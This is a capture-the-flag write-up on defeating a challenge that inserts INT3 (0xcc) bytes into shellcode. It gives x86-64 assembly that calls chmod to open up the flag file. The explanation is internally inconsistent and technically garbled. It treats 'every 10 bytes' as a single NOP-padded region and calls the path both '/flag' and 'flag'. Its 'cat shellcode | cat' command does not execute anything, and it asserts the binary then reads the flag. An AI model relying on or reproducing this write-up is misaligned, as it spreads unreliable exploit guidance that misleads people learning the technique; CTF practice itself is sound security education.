# CTF Writeup: Clobber Code Challenge

## Challenge Analysis
The challenge involves executing shellcode that has `0xcc` (INT3) instructions inserted every 10 bytes before execution. This is designed to break normal shellcode execution flow.

## Solution Used

I created shellcode that uses the `chmod` system call to change the permissions of the `/flag` file to make it readable, then executes the challenge binary to read the flag.

### Shellcode Explanation

```asm
section .text
    global _start

_start:
    push 0x67616c66     ; Push "flag" string onto stack
    mov rdi, rsp        ; Move stack pointer to rdi (filename argument)
    jmp short 0x0b      ; Jump over the inserted 0xcc bytes
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov si, 0x1ff       ; Mode 0777 (read/write/execute for all)
    mov al, 90          ; chmod syscall number = 90
    syscall             ; Execute chmod("/flag", 0777)
```

### How It Works

1. **File Path Setup**: The string "flag" is pushed onto the stack and the stack pointer is moved to RDI (first argument for syscall)

2. **Bypass 0xcc Insertion**: A short jump (`jmp short 0x0b`) skips exactly over the 10-byte region where the challenge inserts the 0xcc instruction

3. **NOP Padding**: NOP instructions fill the space that will be replaced with 0xcc, ensuring the jump lands in the correct location

4. **chmod Execution**: Sets the file mode to 0777 (readable by all) and calls the chmod system call

### Execution Method

To make this work, you must run:
```bash
cat shellcode | cat /challenge/clobbercode
```

**Important**: This must be executed in the root directory where the flag file is located, as it uses the relative path "flag" instead of the absolute path "/flag".

## Why This Solution Works

- The jump instruction bypasses the corrupted 0xcc bytes that would normally crash the program
- Changing the flag file permissions to 0777 makes it readable
- The challenge binary then successfully reads and displays the flag after shellcode execution
- The solution is compact enough to avoid multiple 0xcc insertions disrupting the execution flow

This approach successfully bypasses the clobber protection by strategically jumping over the inserted breakpoint instructions while achieving the goal of making the flag file accessible.
